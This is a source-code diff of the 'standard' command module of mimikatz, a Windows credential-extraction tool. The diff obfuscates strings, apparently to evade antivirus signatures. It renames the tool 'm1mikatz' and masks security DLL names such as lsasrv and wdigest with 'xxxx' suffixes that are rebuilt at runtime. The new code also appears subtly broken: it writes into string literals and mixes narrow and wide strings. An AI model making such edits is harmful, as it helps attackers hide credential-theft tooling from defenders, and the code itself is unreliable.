@@ -6,21 +6,21 @@
 #include "kuhl_m_standard.h"
 
 const KUHL_M_C kuhl_m_c_standard[] = {
-	//{kuhl_m_standard_test,		L"test",	L"Test routine (you don\'t want to see this !)"},
-	{kuhl_m_standard_exit,		L"exit",		L"Quit mimikatz"},
-	{kuhl_m_standard_cls,		L"cls",			L"Clear screen (doesn\'t work with redirections, like PsExec)"},
-	{kuhl_m_standard_answer,	L"answer",		L"Answer to the Ultimate Question of Life, the Universe, and Everything"},
-	{kuhl_m_standard_coffee,	L"coffee",		L"Please, make me a coffee!"},
-	{kuhl_m_standard_sleep,		L"sleep",		L"Sleep an amount of milliseconds"},
-	{kuhl_m_standard_log,		L"log",			L"Log mimikatz input/output to file"},
-	{kuhl_m_standard_base64,	L"base64",		L"Switch file input/output base64"},
-	{kuhl_m_standard_version,	L"version",		L"Display some version informations"},
-	{kuhl_m_standard_cd,		L"cd",			L"Change or display current directory"},
-	{kuhl_m_standard_localtime,	L"localtime",	L"Displays system local date and time (OJ command)"},
-	{kuhl_m_standard_hostname,	L"hostname",	L"Displays system local hostname"},
+	//{kuhl_m_standard_test,		L"test",	"Test routine (you don\'t want to see this !)"},
+	{kuhl_m_standard_exit,		"exit",		"Quit m1mikatz"},
+	{kuhl_m_standard_cls,		"cls",			"Clear screen (doesn\'t work with redirections, like PsExec)"},
+	{kuhl_m_standard_answer,	"answer",		"Answer to the Ultimate Question of Life, the Universe, and Everything"},
+	{kuhl_m_standard_coffee,	"coffee",		"Please, make me a coffee!"},
+	{kuhl_m_standard_sleep,		"sleep",		"Sleep an amount of milliseconds"},
+	{kuhl_m_standard_log,		"log",			"Save m1mikatz input/output to file"},
+	{kuhl_m_standard_base64,	"base64",		"Switch file input/output base64"},
+	{kuhl_m_standard_version,	"version",		"Display some version informations"},
+	{kuhl_m_standard_cd,		"cd",			"Change or display current directory"},
+	{kuhl_m_standard_localtime,	"localtime",	"Displays system local date and time (OJ command)"},
+	{kuhl_m_standard_hostname,	"hostname",	"Displays system local hostname"},
 };
 const KUHL_M kuhl_m_standard = {
-	L"standard",	L"Standard module",	L"Basic commands (does not require module name)",
+	L"standard",	L"Standard module",	"Basic commands (does not require module name)",
 	ARRAYSIZE(kuhl_m_c_standard), kuhl_m_c_standard, NULL, NULL
 };
 /*
@@ -84,14 +84,14 @@ NTSTATUS kuhl_m_standard_base64(int argc, wchar_t * argv[])
 	if(!kull_m_string_args_bool_byName(argc, argv, L"out", &isBase64InterceptOutput))
 		kull_m_string_args_bool_byName(argc, argv, L"output", &isBase64InterceptOutput);
 
-	kprintf(L"isBase64InterceptInput  is %s\nisBase64InterceptOutput is %s\n", isBase64InterceptInput ? L"true" : L"false", isBase64InterceptOutput ? L"true" : L"false");
+	kprintf(L"%hs is %s\n%hs is %s\n", "isBase64InterceptInput", isBase64InterceptInput ? L"true" : L"false", "isBase64InterceptOutput", isBase64InterceptOutput ? L"true" : L"false");
 	return STATUS_SUCCESS;
 }
 
-const wchar_t *version_libs[] = {
-	L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll", L"livessp.dll", L"dpapisrv.dll",
-	L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll", L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll",
-	L"eventlog.dll", L"wevtsvc.dll", L"termsrv.dll",
+wchar_t *version_libs[] = {
+	L"lsasrvxxxx", L"msv1_0xxxx", L"tspkgxxxx", L"wdigestxxxx", L"kerberosxxxx", L"livesspxxxx", L"dpapisrvxxxx",
+	L"kdcsvcxxxx", L"cryptdllxxxx", L"lsadbxxxx", L"samsrvxxxx", L"rsaenhxxxx", L"ncryptxxxx", L"ncryptprovxxxx",
+	L"eventlogxxxx", L"wevtsvcxxxx", L"termsrvxxxx",
 };
 NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 {
@@ -144,6 +144,11 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 		kprintf(L"\n");
 		for(i = 0; i < ARRAYSIZE(version_libs); i++)
 		{
+			size_t j = wcslen(version_libs[i]);
+			version_libs[i][j - 4] = L'.';
+			version_libs[i][j - 3] = L'd';
+			version_libs[i][j - 2] = L'l';
+			version_libs[i][j - 1] = L'l';
 			if(len = GetFileVersionInfoSize(version_libs[i], NULL))
 			{
 				kprintf(L"%s\t: ", version_libs[i]);
@@ -153,9 +158,9 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 					{
 						if(VerQueryValue(buffer, L"\\", (LPVOID *) &verInfo, &lenVer) && (verInfo->dwSignature == VS_FFI_SIGNATURE))
 							kprintf(L"%hu.%hu.%hu.%hu\n", verInfo->dwFileVersionMS >> 16, verInfo->dwFileVersionMS, verInfo->dwFileVersionLS >> 16, verInfo->dwFileVersionLS);
-						else PRINT_ERROR_AUTO(L"VerQueryValue");
+						else PRINT_ERROR_AUTO_C("VerQueryValue");
 					}
-					else PRINT_ERROR_AUTO(L"GetFileVersionInfoEx");
+					else PRINT_ERROR_AUTO_C("GetFileVersionInfoEx");
 					LocalFree(buffer);
 				}
 			}
@@ -192,7 +197,7 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 											}
 										}
 									}
-									else PRINT_ERROR_AUTO(L"PathCombine");
+									else PRINT_ERROR_AUTO_C("PathCombine");
 								}
 								kull_m_cabinet_close(pCab);
 							}
@@ -201,11 +206,11 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 						LocalFree(cabname);
 					}
 				}
-				else PRINT_ERROR_AUTO(L"GetSystemDirectory(data)");
+				else PRINT_ERROR_AUTO_C("GetSystemDirectory(data)");
 				LocalFree(system);
 			}
 		}
-		else PRINT_ERROR_AUTO(L"GetSystemDirectory(init)");	
+		else PRINT_ERROR_AUTO_C("GetSystemDirectory(init)");	
 	}
 	return STATUS_SUCCESS;
 }
@@ -220,7 +225,7 @@ NTSTATUS kuhl_m_standard_cd(int argc, wchar_t * argv[])
 		kprintf(L"%s\n", buffer);
 		LocalFree(buffer);
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_file_getCurrentDirectory");
+	else PRINT_ERROR_AUTO_C("kull_m_file_getCurrentDirectory");
 
 	if(argc)
 	{
@@ -231,9 +236,9 @@ NTSTATUS kuhl_m_standard_cd(int argc, wchar_t * argv[])
 				kprintf(L"New: %s\n", buffer);
 				LocalFree(buffer);
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_file_getCurrentDirectory");
+			else PRINT_ERROR_AUTO_C("kull_m_file_getCurrentDirectory");
 		}
-		else PRINT_ERROR_AUTO(L"SetCurrentDirectory");
+		else PRINT_ERROR_AUTO_C("SetCurrentDirectory");
 	}
 	return STATUS_SUCCESS;
 }
